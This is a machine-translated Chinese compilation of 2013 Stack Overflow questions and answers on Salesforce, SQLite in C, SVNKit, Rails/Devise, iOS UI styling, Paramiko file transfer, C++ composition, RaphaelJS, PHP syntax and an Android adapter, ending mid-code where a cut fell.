我有带有 3 个字段的自定义对象“Subject_ *c”，我通过上传 CSV 文件创建了这些对象。主题*_c 与潜在客户具有查找关系（对于同一用户而言，无论他正在查看什么潜在客户，它都是通用的）。我能够插入相关列表，并且可以看到对象是在数据管理/存储使用下创建的。但它在相关列表下显示为空白。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:03:17.343

您是说自定义对象具有对 Lead 的查找，但是您说 Subjects 是通用的，并且应该以某种方式显示在每个 Lead 页面上？我不认为它会起作用。

*仅当字段 Subject_ c.Lead* _c 将使用“此”潜在客户的 ID 填充时，相关列表才会出现相关列表。（请注意，我对字段名称做了最好的猜测）。因此，您需要为每个潜在客户插入单独的数据，这可能会迅速破坏您的存储使用量，并且在以后维护 a$$ 时会很痛苦。只是为了展示吗？或者您是否计划稍后为每个潜在客户捕获某种调查结果？

如果只是为了显示，我认为您需要在 Lead 页面布局中嵌入 Visualforce 页面，以便以更明智的方式实现这一目标。主题是特定于当前观看用户的？或者它更像是一个通用列表，整个组织只有 3 个主题？

PS“对象”就像普通数据库中的表。我认为您混合了表和存储在其中的数据记录/行之间的差异。

# javascript - 通过 Javascript 以编程方式覆盖高对比度颜色

> ID：15562323
> 
> 赞同：2
> 
> 时间：2013-03-22T03:39:12.940
> 
> 标签：javascript, high-contrast

简而言之，能做到吗？我所看到的是，在任何高对比度模式下，html5 按钮上的任何鼠标悬停/悬停事件都不会导致颜色变化（没有迹象表明您已经“抓住”了按钮，并且鼠标点击实际上会激活它） . 有没有办法在高对比度模式下以编程方式覆盖按钮背景颜色，或者浏览器是否会在覆盖颜色和 CSS 内容时将您排除在外？感谢您对此的任何反馈。

# c - SQLite3 连接到 C 程序并使用内部循环遍历结果 - 做什么？

> ID：15562326
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:39:43.673
> 
> 标签：c, ubuntu, sqlite

:D 我正在阅读 sqlite 的权威指南（欧文斯，艾伦），并决定实际尝试这本好书中的一些代码，并遇到了一些编译问题。我希望众筹其中的一些问题，同时学习一些 C 和 SQLite！哇是的！

我在编译时收到以下神秘的编译错误：gcc mo.c -om -lsqlite3

```
mo.c: In function ‘main’:
mo.c:22:44: error: ‘nrows’ undeclared (first use in this function)
mo.c:22:44: note: each undeclared identifier is reported only once for each function
it appears in
mo.c:22:52: error: ‘ncols’ undeclared (first use in this function)
mo.c:22:2: warning: passing argument 3 of ‘sqlite3_get_table’ from incompatible pointer 
type [enabled by default]
/usr/local/include/sqlite3.h:2084:16: note: expected ‘char ***’ but argument is of  
type  ‘char * (*)[50]’ 
```

我最困惑的是“警告：从不兼容的指针类型[默认启用]传递'sqlite3_get_table'的参数3”和“注意：预期'char *** '但参数是'char *（*）[50]'类型

有问题的程序如下：你能让它进入stackoverflow吗？<================================================== ===================================>

```
#include <stdio.h>
#include <sqlite3.h>
#include <stdlib.h>

int main()
{
sqlite3 *db;
char *zErr;
int rc;
char *sql;
char *result[50];
int j=0;
int i=0;
rc = sqlite3_open("foods-backup.db", &db);

if(rc) {
    fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
    sqlite3_close(db);
    exit(1);
}

rc = sqlite3_get_table(db, sql, &result, &nrows, &ncols, &zErr);

for(i; i < nrows; i++) {
  for(j; j < ncols; j++) {
    /* the i+1 term skips over the first record,
    which is the column headers */
    fprintf(stdout, "%s", result[(i+1)*ncols + j]);
  }
}

if(rc != SQLITE_OK) {
    if (zErr != NULL) {
  fprintf(stderr, "SQL error: %s\n", zErr);
        sqlite3_free(zErr);
    }
}

 /* Free memory */
sqlite3_free_table(result);
// close database connection or something and return everything is okay i guess
sqlite3_close(db);
return 0;
} // end main 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:59:18.970

您得到的错误是由于 1\. `nrows`，`ncols`未声明变量。它们应该被声明为整数。2.`result`变量应该声明为`char **`而不是`char *result[50]`。

所以注释掉你的结果数组指针声明并复制到下面两行。希望这可以帮助。

```
int nrows, ncols;
char **result; 
```

[http://www.sqlite.org/c3ref/free_table.html](http://www.sqlite.org/c3ref/free_table.html)

```
int sqlite3_get_table(
sqlite3 *db,          /* An open database */
const char *zSql,     /* SQL to be evaluated */
char ***pazResult,    /* Results of the query */
int *pnRow,           /* Number of result rows written here */
int *pnColumn,        /* Number of result columns written here */
char **pzErrmsg       /* Error msg written here */ 
```

);

# svn - SVN 版本号随每个文件而变化

> ID：15562328
> 
> 赞同：0
> 
> 时间：2013-03-22T03:39:48.773
> 
> 标签：svn, svnkit

我使用 SVNKit 从一个 SVN Repo 签入文件。给另一个。

我的问题是

目标 svn 的版本随着每个文件的增加而增加。

例如：我从 Repo 中签出了 5 个文件。A 到回购。B 根据一项承诺。我期待 Repo 的版本。B只增加了1个单位，实际上变成了5个单位。

这是我的代码。“cubes”用于恢复我要检出的文件信息。

```
for (int i=0; i<cubes.size();i++) {
    souRepo.getFile(cubes.get(i).getLocalPath()+"/"+cubes.get(i).getLocalFile(),cubes.get(i).getLocalVer(), fileProperties, baos);
    input  = new ByteArrayInputStream(baos.toByteArray() );
    SVNNodeKind nodeKind = tarRepo.checkPath( cubes.get(i).getLocalFile(),  -1 );
    editor = tarRepo.getCommitEditor(logMessage, new CommitMediator() );
    editor.openRoot(-1);

    if ( nodeKind == SVNNodeKind.NONE ) {
       editor.addFile(cubes.get(i).getLocalFile(), null, -1);
    } else {
       editor.openFile(cubes.get(i).getLocalFile(), -1);
    }   // end of else
    editor.applyTextDelta(cubes.get(i).getLocalFile(), null); 
    String baseChecksum = deltaGenerator.sendDelta(cubes.get(i).getLocalFile(), input, editor, true);
    editor.textDeltaEnd(cubes.get(i).getLocalFile() );
    editor.closeFile(cubes.get(i).getLocalFile(), baseChecksum);
    info =  editor.closeEdit();
} 
```

任何想法将不胜感激~~

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T08:49:37.243

该代码显示您每次提交都提交一个文件。尝试这样的事情：

```
editor = tarRepo.getCommitEditor(logMessage, new CommitMediator() );
editor.openRoot(-1);
for (int i=0; i<cubes.size();i++) {
    souRepo.getFile(cubes.get(i).getLocalPath()+"/"+cubes.get(i).getLocalFile(),cubes.get(i).getLocalVer(), fileProperties, baos);
    input  = new ByteArrayInputStream(baos.toByteArray() );
    SVNNodeKind nodeKind = tarRepo.checkPath( cubes.get(i).getLocalFile(),  -1 );

    if ( nodeKind == SVNNodeKind.NONE ) {
       editor.addFile(cubes.get(i).getLocalFile(), null, -1);
    } else {
       editor.openFile(cubes.get(i).getLocalFile(), -1);
    }   // end of else
    editor.applyTextDelta(cubes.get(i).getLocalFile(), null); 
    String baseChecksum = deltaGenerator.sendDelta(cubes.get(i).getLocalFile(), input, editor, true);
    editor.textDeltaEnd(cubes.get(i).getLocalFile() );
    editor.closeFile(cubes.get(i).getLocalFile(), baseChecksum);
}
info =  editor.closeEdit(); 
```

# ruby-on-rails - 如何在帖子下显示用户名

> ID：15562329
> 
> 赞同：1
> 
> 时间：2013-03-22T03:40:00.493
> 
> 标签：ruby-on-rails

用户在我的博客式网站上发帖后，我希望网站在帖子下方发布发布日期和用户姓名。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:51:21.020

对于您创建和更新的时间，您可以使用`created_at`and `updated_at`with `Timestamps`，其中`created_at`给出了创建的日期/时间并`updated_at`给出了最新的更新日期/时间。对于您的发布日期，您可以使用一个额外的字段，例如 publish_at 类型的日期/时间，在您发布文章时更新，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T11:08:03.327

如果您的帖子模型属于用户模型，您可以这样查看用户名：

```
@post.user.name 
```

对于时间戳：

```
@post.created_at 
```

# ruby-on-rails - 设计辅助方法 (current_user) 返回 nil

> ID：15562332
> 
> 赞同：0
> 
> 时间：2013-03-22T03:40:16.130
> 
> 标签：ruby-on-rails, devise

在更新 HAML（从 4.0.0 到 4.0.1）后，我的 Devise 辅助方法出现错误。这可能会触发错误，不确定。

诸如 Devise 辅助方法`user_signed_in?`正在工作（尽管我认为它没有），但是该方法`current_user`不是。引发的此错误是`undefined method name for nil`在`current_user.name.blank?`.

这是我的应用程序控制器：

```
class ApplicationController < ActionController::Base
  before_filter :authenticate_user!
  protect_from_forgery

  rescue_from CanCan::AccessDenied do |exception|
    flash[:alert] = "Access denied."
    redirect_to items_path
  end

end 
```

这是我的应用程序视图（HAML）：

```
!!! 5
%html
  %head
    %title Levitas secondhand
    = stylesheet_link_tag 'application', media: 'all' 
    = javascript_include_tag 'application' 
    = csrf_meta_tags

  %body  
    .container
    %p{class: 'notice notice-block'}= notice
    %p{class: 'alert alert-block'}= alert

    - if signed_in?(:user)
      Ingelogd als
      %strong
    - if current_user.name.blank?
      = link_to current_user.email, current_user
    - else
      = link_to current_user.name, current_user
      |
    - if current_user.provider == nil    
      = link_to 'Account bewerken', edit_user_registration_path
      |
      = link_to "Uitloggen", destroy_user_session_path, method: :delete
    - else
      = link_to "Nieuwe gebruiker", new_user_registration_path
      |
      = link_to "Inloggen", new_user_session_path
      |
      = link_to "Inloggen met Facebook", user_omniauth_authorize_path(:facebook) 
```

在better_errors 的实时 shell 中`current_user`返回`nil`，所以我可以想象为什么我得到错误`name`是`nil`. 但是这种方法总是有效的？！

我试图将其更改为`current_user.blank?`有效的，但随后在下一行中出现相同的错误（如预期的那样）`email`is `nil`.

我能做些什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:12:05.870

也许这只是您的帖子的格式问题，但看起来您可能只是缩进错误？也许这就是你的意思？

```
- if signed_in?(:user)
  Ingelogd als
  %strong
  - if current_user.name.blank?
    = link_to current_user.email, current_user
  - else
    = link_to current_user.name, current_user
    |
  - if current_user.provider == nil    
    = link_to 'Account bewerken', edit_user_registration_path
    |
    = link_to "Uitloggen", destroy_user_session_path, method: :delete
- else
  = link_to "Nieuwe gebruiker", new_user_registration_path
  |
  = link_to "Inloggen", new_user_session_path
  |
  = link_to "Inloggen met Facebook", user_omniauth_authorize_path(:facebook) 
```

# ios - 设置背景图像时UILabel不显示文本

> ID：15562334
> 
> 赞同：0
> 
> 时间：2013-03-22T03:40:36.620
> 
> 标签：ios, cocoa-touch, uilabel

我尝试在 UITableViewCell 中将背景图片设置为标签，但是在运行时，标签中只显示背景图片，不显示文本。

这是我的代码

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"TableCell";

    // Dequeue or create a cell of the appropriate type.
    TableCell *cell = (TableCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
    NSArray *nib = [[NSBundle mainBundle] loadNibNamed:@"TableCell" owner:self options:nil];
    cell = [nib objectAtIndex:0];
    UIImageView *preparationLabelBg = [[UIImageView alloc]
                                    initWithImage:[UIImage imageNamed:@"cellbg.jpeg"]];
    [cell.preparationLabel addSubview:preparationLabelBg];
    cell.preparationLabel.backgroundColor=[UIColor clearColor];
    [cell.preparationLabel sendSubviewToBack:preparationLabelBg];
    [cell.preparationLabel setOpaque:NO];

}

[cell.preparationLabel setFont:[UIFont fontWithName:@"Marker Felt" size:14]];

// Configure the cell.
if (btnselected==1)
{
    cell.preparationLabel.text = [recipe.ingredients objectAtIndex:indexPath.row];
}
else
{
 cell.preparationLabel.text = [recipe.preparation objectAtIndex:indexPath.row];
}
return cell; 
```

}

为什么这里不显示文字？有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:48:41.697

试试这个代码，

```
theLabel.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"cellbg.jpeg"]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:45:56.010

您不应该将背景图像添加到 UILable 而是将背景图像添加到 tableCell 作为 subnview 或将背景图像添加为`[cell.contentview addSubview:[UIImage imageNamed:@"cellbg.jpeg"]]`

也使用 PNG 而不是 JPEG/JPG。苹果更喜欢 PNG。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:46:37.733

而不是将背景`lable`放在`ImageView`后面，`lable`然后将图像设置为`ImageView`。它会起作用的。

# ruby-on-rails - 如何为 IE 浏览器修复我的 ruby on rails 应用程序？一切都关闭了

> ID：15562338
> 
> 赞同：0
> 
> 时间：2013-03-22T03:40:48.727
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, browser, cross-browser

我构建了我的第一个 Rails 应用程序，但使用 Firefox 和 Chrome 构建它们。Web 应用在这些浏览器中看起来不错，但 IE 就差远了。它几乎无法使用（内部以及主页）。在不弄乱其他浏览器的情况下解决此问题的最佳方法是什么？

我是否应该求助于浏览器检测并显示一条错误消息，说明它没有针对 IE 进行优化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:58:23.337

您应该只确定您在 IE 中看到的站点的特定、个别布局问题，然后根据问题开始一一修复它们。让您的网站在所有浏览器中正确呈现并没有一个单一的解决方案，它可能是针对您页面上特定布局问题的修复组合，并经常在您计划支持的所有浏览器中进行测试，以确保每个浏览器都是做出改变后仍然有效。

除此之外，如果没有更具体地描述您的网站存在的渲染问题，这里就没有更多的指导。

# ios - 如何设置默认 UISegmentedControl 外观？

> ID：15562340
> 
> 赞同：8
> 
> 时间：2013-03-22T03:40:57.527
> 
> 标签：ios, iphone, objective-c, uisegmentedcontrol

我使用以下代码设置了 UISegmentedControl 的外观，

```
UIImage *segmentSelected = [[UIImage imageNamed:@"Segment_Unselected.png"]
                            resizableImageWithCapInsets:UIEdgeInsetsMake(0, 12, 0, 12)];
UIImage *segmentUnselected = [[UIImage imageNamed:@"Segment_Selected.png"]
                              resizableImageWithCapInsets:UIEdgeInsetsMake(0, 12, 0, 12)];

[[UISegmentedControl appearance] setBackgroundImage:segmentUnselected
                                           forState:UIControlStateNormal
                                         barMetrics:UIBarMetricsDefault];
[[UISegmentedControl appearance] setBackgroundImage:segmentSelected
                                           forState:UIControlStateSelected
                                         barMetrics:UIBarMetricsDefault];

[[UISegmentedControl appearance] setTitleTextAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
                                                         [UIColor colorWithRed:77.0/255.0 green:45.0/255.0 blue:8.0/255.0 alpha:1],UITextAttributeTextColor,
                                                         [UIColor clearColor], UITextAttributeTextShadowColor,
                                                         [NSValue valueWithUIOffset:UIOffsetMake(0, 0)], UITextAttributeTextShadowOffset,
                                                         [UIFont fontWithName:@"HelveticaNeue-Bold" size:16.0], UITextAttributeFont, nil] forState:UIControlStateNormal];

[[UISegmentedControl appearance] setTitleTextAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
                                                         [UIColor whiteColor],UITextAttributeTextColor,
                                                         [UIColor clearColor], UITextAttributeTextShadowColor,
                                                         [NSValue valueWithUIOffset:UIOffsetMake(0, 0)], UITextAttributeTextShadowOffset,
                                                         [UIFont fontWithName:@"HelveticaNeue-Bold" size:16.0], UITextAttributeFont, nil] forState:UIControlStateSelected];

[[UISegmentedControl appearance] setDividerImage:[UIImage imageNamed:@"SegmentedControl_Divider.png"]
                             forLeftSegmentState:UIControlStateNormal
                               rightSegmentState:UIControlStateNormal
                                      barMetrics:UIBarMetricsDefault]; 
```

我得到了完美的输出 ![在此处输入图像描述](../Images/f909a724489ee7611a75b646933a6598.png)

但现在我想设置**UISegment**的默认外观，如 ![在此处输入图像描述](../Images/a6f0b0ecc34c884e24047c81df25a394.png)

那我该怎么办？？？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-22T04:08:53.493

将此代码放在您想要使用默认控制器的视图控制器上

```
UIImage *segmentSelected = [[UIImage imageNamed:nil]resizableImageWithCapInsets:UIEdgeInsetsMake(0, 12, 0, 12)];
UIImage *segmentUnselected = [[UIImage imageNamed:nil]resizableImageWithCapInsets:UIEdgeInsetsMake(0, 12, 0, 12)];

[[UISegmentedControl appearance] setBackgroundImage:segmentUnselected
                                 forState:UIControlStateNormal
                                 barMetrics:UIBarMetricsDefault];
[[UISegmentedControl appearance] setBackgroundImage:segmentSelected
                                 forState:UIControlStateSelected
                                 barMetrics:UIBarMetricsDefault];

[[UISegmentedControl appearance] setTitleTextAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
                                [UIColor colorWithRed:77.0/255.0 green:45.0/255.0 blue:8.0/255.0 alpha:1],UITextAttributeTextColor,
                                [UIColor clearColor], UITextAttributeTextShadowColor,
                                [NSValue valueWithUIOffset:UIOffsetMake(0, 0)], UITextAttributeTextShadowOffset,
                                [UIFont fontWithName:@"HelveticaNeue-Bold" size:16.0], UITextAttributeFont, nil] forState:UIControlStateNormal];

[[UISegmentedControl appearance] setTitleTextAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
                                 [UIColor whiteColor],UITextAttributeTextColor,
                                 [UIColor clearColor],UITextAttributeTextShadowColor,      
                                 [NSValue valueWithUIOffset:UIOffsetMake(0, 0)],UITextAttributeTextShadowOffset,
                                 [UIFont fontWithName:@"HelveticaNeue-Bold" size:16.0], UITextAttributeFont, nil] forState:UIControlStateSelected];

[[UISegmentedControl appearance] setDividerImage:[UIImage imageNamed:nil] 
                                 forLeftSegmentState:UIControlStateNormal   
                                 rightSegmentState:UIControlStateNormal 
                                 barMetrics:UIBarMetricsDefault]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-22T04:04:58.110

在上面的代码中将 imagename 设置为 nil 并将其放在您想要默认行为的视图上

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-22T03:41:52.857

删除您分配的图像的代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-22T04:09:29.333

将段控制器的图像设置为 nil 。然后，一旦清理你的模拟器然后运行。没事的....

# python - 如何在不使用 Python 下载到本地的情况下将数据从一台服务器传输到另一台服务器？

> ID：15562349
> 
> 赞同：0
> 
> 时间：2013-03-22T03:41:51.810
> 
> 标签：python, ssh, sftp, paramiko

我正在使用 Paramiko 将一些图像下载到本地主机，然后通过 SSH 将它们上传到服务器。

不下载到本地如何实现？由于服务器在下载和上传大文件 (> 100 mb) 时超时。

与此类似的东西： [https ://unix.stackexchange.com/questions/9029/how-to-wget-a-file-to-a-remote-machine-over-ssh](https://unix.stackexchange.com/questions/9029/how-to-wget-a-file-to-a-remote-machine-over-ssh)

但是在 Python 中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:35:36.027

假设您有这样的网络结构：

```
local machine ---X--- machine A
              |            |
              |            Z
              |            |
              ---Y---- machine B 
```

那么您当前正在通过链接下载`X`，然后通过链接上传`Y`。如果`machine A`可以直接与 对话`machine B`，则链接`Z`也存在。这将是两者都可以公开访问的`machine A`情况`machine B`。

因此，您希望将`machine A`图像直接传输到`machine B`. 此时，正在运行的代码正在`machine A/B`处理传输，因此 Python 解决方案可能只会帮助您开始传输。

如果您在 bash shell 中使用 执行此操作`ssh`，您可能会键入如下内容：

```
ssh user@machineA 'scp myfile user@machineB' 
```

这假定您具有对 ssh 服务器的 shell 访问权限，`machine A`并且它已`scp`安装程序。Paramiko 仅用于建立连接`machine A`以启动传输，而不用于处理传输本身。

像这样的东西可能会起作用：

```
ssh = paramiko.SSHClient()
ssh.connect('machineA', username='user', password='passwd')
stdin, stdout, stderr = ssh.exec_command("scp '{imgpath}' user@machineB".format(
    imgpath='path/to/file/on/machineA') 
```

**更新：**

如果正在提供图像`machine A`但您没有 ssh 登录访问权限，则可以`machine B`通过登录`machine B`并执行获取图像的命令直接拉取图像。 `wget`通常可以用于此。因此，执行此操作的代码`localhost`可能是：

```
ssh = paramiko.SSHClient()
ssh.connect('machineB', username='user', password='passwd')
stdin, stdout, stderr = ssh.exec_command("wget '{imgurl}'".format(
    imgurl='http://url.to.image/file') 
```

为了测试，直接跳过 paramiko 的使用，直接使用 ssh/wget。

# c++ - 构图模式

> ID：15562357
> 
> 赞同：2
> 
> 时间：2013-03-22T03:42:19.130
> 
> 标签：c++, design-patterns, inheritance, encapsulation, composition

应该如何处理组合而不是继承？考虑以下类：

```
class GameObject {...};

class Sprite {
public:
    void changeImage(...);
};

class VisibleGameObject: public Sprite, public GameObject {};

class VisibleGameObject : public GameObject {
    protected:
        Sprite m_sprite;
}; 
```

第一个 VisibleGameObject 类使用继承。多重继承。看起来不太好。第二个是我想使用的，但它不允许我像这样访问 Sprite 的 API：

```
VisibleGameObject man;
man.changeImage(); 
```

没有继承（或代码重复）如何实现呢？

编辑：我知道我可以只使用继承或创建`m_sprite`一个公共成员，但我无法访问 Sprite 类，因为它是`private`. 这就是重点，问题是关于更改 a`VisibleGameObject`的 Sprite 的最佳方式，遵循数据封装的规则。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-24T09:13:15.750

我认为您仍然是“组合胜过继承”思维方式的一步。基类应该知道要合成什么。要改变图像，你应该改变精灵实例，你不应该提供组合实例的接口。例如：

```
class GameObject {
public:
    // you can choose public access or getters and setters, it's your choice
    Sprite sprite;
    PhysicalBody body;
};

object = GameObject();
object.sprite = graphicalSystem.getSpriteFromImage("image.png");
// or if you prefer setters and getters
object.setSprite(sprite); 
```

更一般地说，GameObject 应该包含基类 Component 的实例（或指向实例的指针，取决于您的实现）。在这种情况下使用继承是有意义的，因为这样它们可以像 std::map 一样在一个存储中。例如：

```
class Component {
    // ...
};

class Sprite : public Component {
    //...
};

class PhysicalBody : public Component {
    //...
};

class GameObject {
protected:
    std::map<std::string, Component*> components;
    //...
public:
    Component* getComponent(const std::string& name) const;
    void setComponent(const std::string& name, Component* component);
    //...
}; 
```

对于主循环中的组件创建和渲染，请使用**Systems**。例如，GraphicalSystem 知道它创建的所有 Sprite 实例，并且在渲染时它只渲染附加到某个 GameObject 实例的精灵。分离的组件可以被垃圾收集。有关位置和大小的信息可能是游戏对象的一部分，也可能是“物理”组件。

理解它的最好方法是编写自己的原型或检查现有的实现（[Artemis](http://gamadu.com/artemis/)、[Unity 3D](http://docs.unity3d.com/Documentation/Manual/GameObjects.html)和许多其他）。有关更多信息，请参阅[Cowboy 编程：发展您的层次结构](http://cowboyprogramming.com/2007/01/05/evolve-your-heirachy/)或尝试查找实体/组件系统。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-24T22:01:47.463

首先，[组合的替代方案是私有继承](http://www.parashift.com/c++-faq/priv-inherit-like-compos.html)（而不是公共继承），因为两者都建立了*具有*关系的模型。

重要的问题是我们如何将`Sprite`公共成员（例如`changeImage`）暴露给`VisibleGameObject`客户？我介绍了我知道的 4 种方法：

## （私有）继承

我了解您想避免（多重）继承，但为了完整起见，我提出一个基于私有继承的建议：

```
class VisibleGameObject: private Sprite, public GameObject {
...
}; 
```

在这种情况下`VisibleGameObject`，私下派生自`Sprite`. 然后前者的用户不能访问后者的任何成员（就好像它是私人成员一样）。特别是，`Sprite`的公共和受保护成员对`VisibleGameObject`客户是隐藏的。

如果继承是公开的，那么**所有** `Sprite`的公开和受保护成员都将暴露`VisibleGameObject`给它的客户。使用私有继承，我们可以更好地控制应该通过使用声明公开哪些方法。例如，这暴露了`Sprite::changeImage`：

```
class VisibleGameObject1: private Sprite, public GameObject {
public:
    using Sprite::changeImage;
...
}; 
```

## 转发方式

`VisibleGameObject`我们可以将调用转发给公共方法，`m_sprite`如下所示。

```
class VisibleGameObject2: public GameObject {
public:
    void changeImage() {
        m_sprite.changeImage();
    }
private:
    Sprite m_sprite;
...
}; 
```

我相信**这是最好的设计**，尤其是在封装方面。但是，相对于其他替代方案，它可能需要大量输入。

## 结构解引用运算符

即使是普通的旧 C 也提供了暴露另一种类型的接口的类型，就好像它是它自己的一样：指针。

确实，假设它`p`是 type `Sprite*`。然后通过使用结构解引用运算符`->`，我们可以访问`Sprite`（指向`p`）的成员，如下所示。

```
p->changeImage(); 
```

C++ 允许我们为类赋予定制的结构取消引用运算符（智能指针很好地使用的一个特性）。我们的例子变成：

```
class VisibleGameObject3 : public GameObject {
public:
    Sprite* operator ->() {
        return &m_sprite;
}
private:
    Sprite m_sprite;
...
}; 
```

和

```
VisibleGameObject v;
v->changeImage(); 
```

这种方法虽然方便，但也有很多缺陷：

1.  至于公共继承，这种方法不能很好地控制`Sprite`应该公开哪些公共成员。
2.  它仅适用于一个成员（也就是说，您不能使用相同的技巧来公开两个成员接口）。
3.  它与界面混淆。确实，例如考虑`VisualGameObject`有一个方法`doSomething()`。`v`然后，在一个应该做的对象上调用这个方法，`v.doSomething()`而调用`changeImage()`一个应该使用`v->changeImage()`. 这令人困惑。
4.  它`VisibleGameInterface`看起来像一个智能指针。这在语义上是错误的！

## C++11 包装模式

最后，还有 Sutter 的 C++11 Wrapper Pattern（观看他的[演示文稿](http://channel9.msdn.com/Shows/Going+Deep/C-and-Beyond-2012-Herb-Sutter-Concurrency-and-Parallelism)，特别是第 9 页的第二张[幻灯片](https://skydrive.live.com/?cid=f1b8ff18a2aec5c5&id=F1B8FF18A2AEC5C5!1176)）：

```
class VisibleGameObject4 : public GameObject {
private:
    Sprite m_sprite;
public:
    template <typename F>
    auto operator()(F f) -> decltype(f(m_sprite)) {
        return f(m_sprite);
    }
}; 
```

客户这样使用它：

```
VisibleGameObject4 v4;
v4( [](Sprite& s) { return s.changeImage(); } ); 
```

正如我们所看到的，与转发方法相比，这种方法将打字的负担从类编写者转移到了类客户端。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:03:41.643

看起来您正在尝试直接访问 Sprite 的函数而不先引用它。尝试这个：

```
man.m_sprite.changeImage() ; 
```

请注意， m_sprite 和 changeImage() 应该是公开的，以便您执行此操作。否则使用公共访问器函数来操作私有类成员。

# raphael - 在 RaphaelJS 中优化设置拖放

> ID：15562358
> 
> 赞同：0
> 
> 时间：2013-03-22T03:42:28.010
> 
> 标签：raphael

因此，当集合中的某些元素对它们发起了拖动事件时，我尝试使用翻译并调用集合上的拖动事件。但它有点慢。有谁知道如何优化以使其更快？

这是我使用的功能

```
function dragsymbolsoncanvas(foo){//foo is the set passed. 
function dragger(){
    this.dx = this.dy = 0;
};
function mover(s){
    return function(dx, dy){
        (s||this).translate(dx-this.dx,dy-this.dy);
        this.dx = dx;
        this.dy = dy;
    }
};
foo.forEach(function(herp){//set.forEach function from raphaeljs
    if(herp.data("candrag")=="true"){
        foo.drag(mover(foo), dragger);        
    }
}); 
```

};

有没有一种方法可以加快速度，而无需在我想要使其可拖动的部分上绘制不可见的元素并将处理程序附加到这些部分？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-21T05:57:20.643

```
 var position;
    var rect = paper.rect(20, 20, 40, 40).attr({
            cursor: "move",
            fill: "#f00",
            stroke: "#000"
    });
    t = paper.text(70,70, 'test').attr({
            "font-size":16, 
            "font-family": 
            "Arial, Helvetica, sans-serif" 
    });
    var st = paper.set();
    st.push(rect, t);
    rect.mySet = st;
    rect.drag(onMove, onStart, onEnd);
    onStart = function () {
        positions = new Array();
        this.mySet.forEach(function(e) {
            var ox = e.attr("x");
            var oy = e.attr("y");
            positions.push([e, ox, oy]);
        });
    }
    onMove = function (dx, dy) {
        for (var i = 0; i < positions.length; i++) {//you can use foreach but I want to                 show that is a simple array
            positions[i][0].attr({x: positions[i][1] + dx, y: positions[i][2] + dy});
        }
    }
    onEnd = function() {} 
```

# php - PHP中符号的含义是什么

> ID：15562359
> 
> 赞同：-6
> 
> 时间：2013-03-22T03:42:37.697
> 
> 标签：php, yii

我有一些新手问题，但我无法使用谷歌轻松搜索那些运营商，因此希望有人能帮助我。

1.  运算符 :: 用于什么？
2.  字符串的“”和“”之间有区别吗
3.  我看到了\exception，\ 是做什么用的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T03:44:54.717

> 1\. 运算符 :: 是干什么用的？

它是[范围解析运算符](http://php.net/manual/en/language.oop5.paamayim-nekudotayim.php)。

> 2.字符串的""和''有区别吗

是的。[双引号](http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.double)允许插值和特殊字符，例如`\n`. 单引号不会特殊对待字符串。

> 3.我看到\exception，\是干什么用的？

`\`是[命名空间运算符](http://php.net/manual/en/language.namespaces.basics.php)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:51:40.090

1.有时在基类中引用函数和变量或者在还没有任何实例的类中引用函数是有用的。`The :: operator`正在为此使用。

参考： http: [//php.net/manual/en/keyword.paamayim-nekudotayim.php](http://php.net/manual/en/keyword.paamayim-nekudotayim.php)

2.

```
Single quoted 
```

指定字符串的最简单方法是将其括在单引号中（字符 '）。

```
Double quoted 
```

如果字符串用双引号 (") 括起来，PHP 将为特殊字符解释更多的转义序列。

参考： http: [//php.net/manual/en/language.types.string.php](http://php.net/manual/en/language.types.string.php)

3.Answer is here[在 PHP 中导入类和命名空间：前导反斜杠有什么区别？](https://stackoverflow.com/questions/4849279/importing-classes-and-namespaces-in-php-what-difference-does-a-leading-backslas)

# android - 使用 BaseAdapter 的 getFilter() 抛出错误

> ID：15562361
> 
> 赞同：1
> 
> 时间：2013-03-22T03:42:52.203
> 
> 标签：android, filter, baseadapter

我知道有关于这个主题的帖子，但我找不到我的代码中的问题。尝试 2 天后，我在这里发帖。这是我的适配器：

```
public class CustomerListBaseAdapter extends BaseAdapter implements Filterable {
private static ArrayList<CustAccountObject> CustArrayList;

private LayoutInflater l_Inflater;

public CustomerListBaseAdapter(Context context, ArrayList<CustAccountObject> results) {
    CustArrayList = results;
    l_Inflater = LayoutInflater.from(context);
}

public int getCount() {
    return CustArrayList.size();
}

public Object getItem(int position) {
    return CustArrayList.get(position);
}

public long getItemId(int position) {
    return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
    ViewHolder holder;
    if (convertView == null) {
        convertView = l_Inflater.inflate(R.layout.customer_list_format, null);
